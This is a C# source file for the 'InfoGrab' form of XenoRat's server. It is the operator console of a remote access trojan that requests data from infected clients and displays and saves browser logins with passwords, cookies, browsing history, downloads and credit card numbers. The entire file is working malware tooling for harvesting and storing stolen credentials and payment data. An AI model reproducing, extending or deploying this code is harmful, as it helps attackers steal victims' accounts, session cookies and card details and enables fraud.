using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace XenoRatServer.Forms
{
    public partial class InfoGrab : Form
    {
        private readonly Node client;

        public InfoGrab(Node client)
        {
            this.client = client;
            InitializeComponent();
        }

        private void DisableAllButtons()
        {
            foreach (Control control in Controls.OfType<Button>())
            {
                control.Enabled = false;
            }
        }

        private void EnableAllButtons()
        {
            foreach (Control control in Controls.OfType<Button>())
            {
                control.Enabled = true;
            }
        }

        private static List<T> DeserializeList<T>(byte[] bytes, Func<BinaryReader, T> deserializeFunc)
        {
            List<T> dataList = new List<T>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
                using (BinaryReader reader = new BinaryReader(memoryStream))
                {
                    int count = reader.ReadInt32();
                    for (int i = 0; i < count; i++)
                    {
                        dataList.Add(deserializeFunc(reader));
                    }
                }
            return dataList;
        }

        private async Task<byte[]> SendAndReceiveAsync(byte[] requestData)
        {
            await client.SendAsync(requestData);
            return await client.ReceiveAsync();
        }

        private void DisplayData<T>(List<T> dataList, RichTextBox richTextBox)
        {
            richTextBox.Text = string.Join(Environment.NewLine, dataList);
        }

        private void DisplayErrorMessage()
        {
            MessageBox.Show("An error has occurred with the infograbbing!");
            Close();
        }

        private async void RetrieveAndDisplayDataAsync<T>(byte[] requestData, Func<BinaryReader, T> deserializeFunc, RichTextBox richTextBox)
        {
            DisableAllButtons();
            byte[] data = await SendAndReceiveAsync(requestData);
            if (data == null)
            {
                DisplayErrorMessage();
                return;
            }
            DisplayData(DeserializeList(data, deserializeFunc), richTextBox);
            EnableAllButtons();
        }

        private async void Button_Click<T>(byte[] requestData, Func<BinaryReader, T> deserializeFunc, RichTextBox richTextBox)
        {
            await RetrieveAndDisplayDataAsync(requestData, deserializeFunc, richTextBox);
        }

        private async void Button_Click_SaveToTextFile(RichTextBox richTextBox)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "txt files (*.txt)|*.txt",
                DefaultExt = "txt",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = saveFileDialog.FileName;
                using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                    using (StreamWriter writer = new StreamWriter(fileStream))
                    {
                        await writer.WriteAsync(richTextBox.Text);
                    }
            }
        }

        private void Button_Login_Click(object sender, EventArgs e)
        {
            Button_Click(new byte[] { 0 }, reader => new Login(reader.ReadString(), reader.ReadString(), reader.ReadString()), richTextBox1);
        }

        private void Button_Cookie_Click(object sender, EventArgs e)
        {
            Button_Click(new byte[] { 1 }, reader => new Cookie(reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox2);
        }

        private void Button_WebHistory_Click(object sender, EventArgs e)
        {
            Button_Click(new byte[] { 4 }, reader => new WebHistory(reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox3);
        }

        private void Button_Download_Click(object sender, EventArgs e)
        {
            Button_Click(new byte[] { 3 }, reader => new Download(reader.ReadString(), reader.ReadString()), richTextBox4);
        }

        private void Button_CreditCard_Click(object sender, EventArgs e)
        {
            Button_Click(new byte[] { 2 }, reader => new CreditCard(reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadString(), reader.ReadInt64()), richTextBox5);
        }

        private void Button_SaveLogin_Click(object sender, EventArgs e)
        {
            Button_Click_SaveToTextFile(richTextBox1);
        }

        private void Button_SaveCookie_Click(object sender, EventArgs e)
        {
            Button_Click_SaveToTextFile(richTextBox2);
        }

        private void Button_SaveWebHistory_Click(object sender, EventArgs e)
        {
            Button_Click_SaveToTextFile(richTextBox3);
        }

        private void Button_SaveDownload_Click(object sender, EventArgs e)
        {
            Button_Click_SaveToTextFile(richTextBox4);
        }

        private void Button_SaveCreditCard_Click(object sender, EventArgs e)
        {
            Button_Click_SaveToTextFile(richTextBox5);
        }
    }

    public class Login
    {
        public Login(string url, string username, string password)
        {
            Url = url;
            Username = username;
            Password = password;
        }

        public string Url { get; }
        public string Username { get; }
        public string Password { get; }

        public override string ToString()
        {
            return $"URL: {Url}\nUsername: {Username}\nPassword: {Password}\n";
        }
    }

    public class Cookie
    {
        public Cookie(string host, string name, string path, string value, long expires)
        {
            Host = host;
            Name = name;
            Path = path;
            Value = value;
            Expires = expires;
        }

        public string Host { get; }
        public string Name { get; }
        public string Path { get; }
        public string Value { get; }
        public long Expires { get; }

        public override string ToString()
        {
            DateTime expirationDateTime = DateTimeOffset.FromUnixTimeSeconds(Expires).LocalDateTime;
            return $"Host: {Host}\nName: {Name}\nPath: {Path}\nValue: {Value}\nExpires: {expirationDateTime}\n";
        }
    }

    public class WebHistory
    {
        public WebHistory(string url, string title, long timestamp)
        {
            Url = url;
            Title = title;
            Timestamp = timestamp;
        }

        public string Url { get; }
        public string Title { get; }
        public long Timestamp { get; }

        public override string ToString()
        {
            DateTime timestampDateTime = DateTimeOffset.FromUnixTimeSeconds(Timestamp).LocalDateTime;
            return $"URL: {Url}\nTitle: {Title}\nTimestamp: {timestampDateTime}\n";
        }
    }

    public class Download
    {
        public Download(string tabUrl, string targetPath)
        {
            TabUrl = tabUrl;
            TargetPath = targetPath;
        }

        public string TabUrl { get; }
        public string TargetPath { get; }

        public override string ToString()
        {
            return $"Tab URL: {TabUrl}\nTarget Path: {TargetPath}\n";
        }
    }

    public class CreditCard
    {
        public CreditCard(string name, string month, string year, string number, long dateModified)
        {
            Name = name;
            Month = month;
            Year = year;
            Number = number;
            DateModified = dateModified;
        }

        public string Name { get; }
        public string Month { get; }
        public string Year { get; }
        public string Number { get; }
        public long DateModified { get; }

        public override string ToString()
        {
            DateTime modifiedDateTime = DateTimeOffset.FromUnixTimeSeconds(DateModified).LocalDateTime;
            return $"Name: {Name}\nExpiry: {Month}/{Year}\nNumber: {Number}\nModified Date: {modifiedDateTime}\n";
        }
    }
}
